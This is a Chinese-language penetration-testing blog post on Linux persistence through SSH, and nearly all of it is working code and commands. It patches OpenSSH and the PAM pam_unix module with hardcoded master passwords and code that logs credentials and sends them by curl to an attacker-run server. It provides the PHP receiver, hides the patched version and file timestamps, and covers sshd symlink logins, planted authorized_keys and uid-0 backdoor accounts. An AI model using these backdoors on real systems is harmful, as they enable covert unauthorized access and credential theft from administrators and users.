---
title: day16-权限维持篇-Linux-SSH利用
date: 2024-03-21 23:07 +0800
categories: [内网,权限维持] 
tags: [横向移动,Linux]
img_path: /img/penetration/
---
## 0x00 前言

本次，主要是进行有关于Linux的一些权限维持的技术手段。主要从linux登录的角度来进行权限维持的，其中主要涉及以下三个思路方面：

- 替换版本-OpenSSH后门  ==> 通过替换linux上openssh的版本来实现一个具备`万能密钥`的ssh，以及记录下本机器使用的`ssh账号密码`
- 更改验证-SSH-PAM后门  ==> 通过修改`PAM`的认证来实现`万能`密钥的连接
- 登录方式-软链接&公私钥&新帐号  ==> 通过更改验证方式、获取到对应账户的密钥以及添加新账号来实现权限的维持。

为了更贴近真实环境，这里我们采用云端的`Linux`来进行实验 ==> 采用的服务器是：`Centos 7.7`

## 0x01 替换版本-OpenSSH后门

OpenSSH是SSH（Secure Shell）协议的免费开源实现。很多人误认为OpenSSH与OpenSSL有关联，但实际上这两个计划有不同的目的和不同的发展团队，名称相近只是因为两者有同样的发展目标──提供开放源代码的加密通信软件。

### 1、利用原理

替换本身操作系统的ssh协议支撑软件openssh，重新安装自定义的openssh,达到记录帐号密码，也可以采用万能密码连接的功能！

### 2、利用

我们将演示万能密码链接，实现对`ssh`版本替换的掩藏、以及记录账户密码！接下来让我们开始实验吧！！！

#### 1）环境准备

*安装依赖包*

```bash
yum -y install openssl openssl-devel pam-devel zlib zlib-devel 
yum -y install gcc gcc-c++ make 
```

*准备安装包*

```bash
wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz # 后门文件
wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz # openssh5.9文件
```

*备份版本以及ssh的配置文件修改日期*

这里这一步主要是为了后续的伪装！！！

![截图](24d31823393eccef4ab5240cfbd64f17.png)

~~SHH版本: OpenSSH_7.4p1, OpenSSL 1.0.2k-fips  26 Jan 2017~~

```bash
ssh -V > ssh.txt
mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
```

#### 2）解压、修改后门配置

*解压并安装补丁*

```bash
tar zxf openssh-5.9p1.tar.gz
c
cp openssh-5.9p1.patch/sshbd5.9p1.diff  openssh-5.9p1
cd openssh-5.9p1
patch < sshbd5.9p1.diff # 打补丁就是修改替换原文件
```

如果环境没有`patch`，就自己安装一下

```bash
yum install patch
```

*添加后门万能密码*

修改`includes.h`文件中记录用户名和密码的文件位置及其密码，命令如下

```bash
vim includes.h
```

在文件的最后面：

```bash
#define ILOG "/tmp/ilog" 	//记录登录本机的用户名和密码
#define OLOG "/tmp/olog" 	//记录本机登录远程的用户名和密码
#define SECRETPW "yuan" //后门的密码
```

![截图](c82bd7295b329caecc76ea9477db68b0.png)

*发送账户密码到vps上*

> 这里我参考网上的内容时候发现一直复现不成功，也不知道是什么原因。但是我觉得这个能将ssh的账号密码发送到自己的vps上是十分有用的。因此，再经过我一个下午努力后我将原文的代码进行了调整与简化后，就发现可以发送了！！！ 下面我将给出我自己调整后的代码以及遇到的bug！

客户端：

```php
<?php
/* author: yuan
   time: 2024-03-19 17:05

*/
$username = $_POST['username'];
$password = $_POST['password'];
$time=date('Y-m-d H:i:s',time());
 if(isset($username) != "" || isset($password) !="" )
 {
    $fp = fopen("./sshlog.txt","a+");
    $result = "sername:.$username--->:Password:$password----->time:$time";
    echo $result;
    fwrite($fp,'sss');
    fwrite($fp,$result);
    fwrite($fp,"\r\n");
    fclose($fp);
 }
?>
```
{: file='ssh.php'}

这里，如果使用`apache`启动的客户端可能会有个bug！！ 导致一直无法出现账号密码文件！ 如果读者在此也同样出现了这个问题，可以参考本章的最后一部分`bug处理篇`。

接收端：（修改`auth-passwd.c`文件，大概在地128行左右）

```c_cpp
	result = sys_auth_passwd(authctxt, password);
	if(result){
		if((f=fopen(ILOG,"a"))!=NULL){
			fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
			fclose(f);
      char szres[1024] = {0};
      memset(szres,0,sizeof(szres));
      snprintf(szres,sizeof(szres),"/usr/bin/curl -s -d \"username=%s&password=%s\" http://xx.xx.xx.xx/ssh.php >/dev/null",authctxt->user, password);
      system(szres); 
		}
	}
	if (authctxt->force_pwchange)
		disable_forwarding();
	return (result && ok);
}
```
{: file='auth-passwd.c'}

#### 3）伪装并编译

*修改`version.h`文件，使其修改后的版本信息为原始版本：*

```c_cpp
#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"
#define SSH_PORTABLE "小版本号"
```
{: file='version.h'}
![截图](c16c9484842ac2b9f8121849cbef64b1.png)

*安装并编译*

```bash
./configure --prefix=/usr  --sysconfdir=/etc/ssh  --with-pam  --with-kerberos5  && make && make install
```

![截图](096ab5d4bbd7bcd29c9f54721489e71b.png)

*重启ssh*

```bash
service sshd restart
systemctl status sshd.service
```

这里可能会出现如下错误：

```text
Job for sshd.service failed because a timeout was exceeded. See "systemctl status sshd.service" and "journalctl -xe" for details.
```

解决办法：

```bash
chmod 666 /etc/ssh/ssh_host_rsa_key
chmod 666 /etc/ssh/ssh_host_ecdsa_key
service sshd restart
```

或者

```bash
chown -R root.root /var/empty/sshd
chmod 744 /var/empty/sshd
service sshd restart
```

*回复配置文件日期*

恢复新配置文件的日期，使其与旧文件的日期一致。对`ssh_config`和`sshd_config`文件的内容进行对比，使其配置文件一致，然后修改文件日期。

```bash
touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config
touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config
```

![截图](d072ee9f704c9dc83801f83e7305e969.png)

可以看到这里已经伪装完毕！！！

#### 4）效果验证

这时候，我们就可以使用万能密码登录了！

```bash
ssh root:yuan@ip -o HostKeyAlgorithms=+ssh-dss
```

![截图](3046af4bfe2fa2f68faab1b6c8100670.png)

尝试记录密码，用正确的账号与密码登录：

注意，这里可能会有报错:（因为ssh7.0以后不再支持`ssh-dss`）

![截图](e38b5fffb23fa978d331daa044451a01.png)

我们需要添加：

```bash
ssh root:密码@ip -o HostKeyAlgorithms=+ssh-dss
```

查看`ilog`文件，查看当前主机正确的登录密码！！

![截图](5f73328efcd7b04256274f131a092d3b.png)

发送账户密码到远端：

![截图](24267512ebbfe2f7227d981de9ee7d0b.png)

## 0x02 更改验证-SSH-PAM后门

`PAM`是一种认证模块，`PAM`可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于`/etc/pam.d`)，最后调用认证文件(于`/lib/security`)进行安全认证.简易利用的`PAM`后门也是通过修改`PAM源码`中认证的逻辑来达到权限维持。

整体实现的流程：

- 获取目标系统所使用的PAM版本，下载对应版本的pam版本
- 解压缩，修改pam_unix_auth.c文件，添加万能密码
- 编译安装PAM
- 编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即使用万能密码登陆，将用户名密码记录到文件中。

#### 利用

1、关闭linux的安全模式：

```bash
selinux setenforce 0
```

2、查看版本：

```bash
rpm -qa | grep pam
```

![截图](298511793480132b40e6849ba71d62af.png)

3、下载对应的版本：

```bash
wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz
tar -zxvf Linux-PAM-1.1.8
yum install gcc flex flex-devel -y
```

4、修改配置

留PAM后门和保存SSH登录的账号密码，修改` Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c`（大概在180行左右）：

```c_cpp
	/* verify the password of this user */
	retval = _unix_verify_password(pamh, name, p, ctrl);
  if(strcmp("yuan-hacker",p)==0){return PAM_SUCCESS;}    //后门密码
    if(retval == PAM_SUCCESS){    
           FILE * fp;    
           fp = fopen("/tmp/.sshlog", "a");//SSH登录用户密码保存位置
           fprintf(fp, "%s : %s\n", name, p);    
           fclose(fp);} 
	name = p = NULL;
```
{: file='pam_unix_auth.c'}
5、编译与安装：（进入到`Linux-PAM-1.1.8`目录之下）

```bash
./configure && make
```

6、备份与复制：

备份原有pam_unix.so,防止出现错误登录不上
复制新PAM模块到/lib64/security/目录下 

```bash
cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp
cd modules/pam_unix/.libs
cp pam_unix.so /usr/lib64/security/pam_unix.so
```

*效果验证*

![截图](7e7629875baf0c3fd9dae84af7386828.png)

此时查看`/tmp/.sshlog`就可以查看到对应的密码了！

![截图](f81243cb0259eab98d8e6d2de1f47c33.png)

这里经过我的测试，若我们在`ssh`的登录密码处加上如下代码，即可实现远程发送账号密码到vps上：

```c_cpp
	/* verify the password of this user */
	retval = _unix_verify_password(pamh, name, p, ctrl);
  if(strcmp("yuan1",p)==0){return PAM_SUCCESS;}    //后门密码
  if(retval == PAM_SUCCESS){  
           char szres[1024] = {0};  
           FILE * fp;    
           fp = fopen("/tmp/.sshlog", "a");//SSH登录用户密码保存位置
           fprintf(fp, "%s : %s\n", name, p);    
           fclose(fp);
           memset(szres,0,sizeof(szres));
           snprintf(szres,sizeof(szres),"/usr/bin/curl -s -d \"username=%s&password=%s\" http://[vpsip]/ssh.php >/dev/null",name,p);
    system(szres);  
    } 
```
{: file='pam_unix_auth.c'}

然后测试正常登录后即可记录！！！

![截图](aa847a0d921a5bbd28d68a21703c0581.png)

## 0x03 登录方式-软链接&公私钥&新帐号

本部分，主要通过ssh的登陆模块进行介绍。

### 1、软链接

在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录。
SSH配置中开启了PAM进行身份验证

#### 利用

1、查看是否使用PAM进行身份验证：

```bash
cat /etc/ssh/sshd_config|grep UsePAM
```

（这里如果是no可以去这个配置文件中直接去修改，不过需要是root权限哦。）

2、创建软链接：

```bash
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
```

3、此时，任意密码即可登录：

```bash
ssh root@xx.xx.xx.xx -p 8888
```

> 该方法一旦重启，则会失效！！！ 可以配合定时任务使用，效果更佳

### 2、公私钥

这个直接利用公私密钥进行匹配即可完成登录：

开启：（这里要注意不管是攻击机还是目标机器都需要开启这个验证。）

```bash
vim /etc/ssh/sshd_config

RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
```

攻击机生成密钥：

```bash
ssh-keygen -t rsa #三次回车

id_rsa : 私钥
id_rsa.pub : 公钥
```

![截图](59c5627fa9444da666e5316c77f07ebf.png)

然后将将攻击机中的公钥中的内容复制到`authorized_keys`中。如果本地没有这个文件那就创建一个：

```bash
/root/.ssh/authorized_keys
```

本地连接即可：

 这里直接去登录就会发现是不需要使用密码验证的，其实在kali去连接目标主机的时候就已经进行了密钥验证。

```bash
ssh root@ip
```

### 3、后门账户

创建后门账户同样都容易被发现，除非服务器日常都没人巡检，若正常有管理员巡检或者设置的比较严格的，通常都不能保留的时间太长。

两种添加账户的方法：

```bash
useradd -p `openssl passwd -1 -salt 'salt' 123456` test1 -o -u 0 -g root -G root -s /bin/bash -d /home/test1

echo "yuan:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号
passwd yuan  #修改yuan的密码为yuan123
```

![截图](dab44d770bb8b983865704e573bc9058.png)

![截图](8f28aced5f514d4d5d27e414a4d10747.png)

<br/>

## 0x04 bug处理

这里，很可能会出现`php`无法写入文件的情况。这主要是由于：Apache是通过用户www-data来执行PHP的，所以PHP能够做什么，取决于用户www-data能做什么？一般情况下，www-data用户并没有在www/html下面写文件的权限，所以PHP在通过浏览器访问的时候是没有办法写入文件的。

因此，解决办法是：

可以简单的把www/html或者www/html下面的某个子目录比如/var/www/html/download的所有者设置为www-data，这样PHP就可以正常写文件。

```bash
sudo chown -R www-data /var/www/html
```

==该部分内容参考自：https://blog.csdn.net/zhanghaiyang9999/article/details/106114073==

！

------

## Donation

If this blog help you reduce time to develop, you can give me a cup of coffee :)

如果觉得我的博客对你有帮助的话，可以小小的赞助我一杯咖啡~🙌

<center class="half">
    <img src="/img/1.jpg" width="300"/>
    <img src="/img/2.jpg" width="300"/>
</center>

